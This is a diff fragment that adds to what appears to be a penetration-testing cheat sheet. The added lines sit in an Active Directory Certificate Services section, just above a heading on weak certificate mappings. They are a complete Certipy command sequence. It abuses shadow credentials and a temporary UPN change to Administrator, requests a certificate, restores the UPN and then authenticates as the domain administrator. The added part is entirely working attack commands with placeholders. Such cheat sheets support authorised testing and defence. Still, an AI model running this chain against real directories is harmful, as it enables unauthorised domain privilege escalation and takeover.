@@ -4390,6 +4390,16 @@ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user 
 certipy auth -pfx administrator.pfx -domain <DOMAIN>
 ```
 
+or
+
+```c
+certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
+certipy account update -username <USERNAME>@<DOMAIN> -hashes <HASH> -user <USERNAME> -upn Administrator
+certipy req -ca '<CA>' -username <USERNAME> -password '<PASSWORD>' -template <TEMPLATE>
+certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
+certipy auth -pfx administrator.pfx -domain <DOMAIN>
+```
+
 ##### ESC10: Weak Certificate Mappings
 
 ###### Case 1
